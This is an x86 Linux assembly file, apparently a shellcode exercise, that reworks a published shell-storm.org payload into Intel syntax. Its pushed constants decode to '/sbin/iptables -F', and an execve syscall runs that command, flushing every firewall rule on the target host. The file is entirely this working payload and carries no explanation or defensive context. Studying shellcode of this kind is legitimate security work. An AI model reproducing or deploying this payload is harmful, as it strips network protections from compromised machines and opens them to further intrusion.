; ORIGINAL SHELLCODE
; http://shell-storm.org/shellcode/files/shellcode-825.php

; THIS HAS BEEN CONVERTED TO INTEL SYNTAX

global _start

section .text

_start:
    xor    eax,eax
    push   eax
    push   0x462d
    mov    esi, esp
    push   eax
    push   0x73656c62
    push   0x61747069
    push   0x2f6e6962
    push   0x732f2f2f
    mov    ebx, esp
    push   eax
    push   esi
    push   ebx
    mov    ecx, esp
    mov    edx, eax
    mov    al, 0xb
    int    0x80
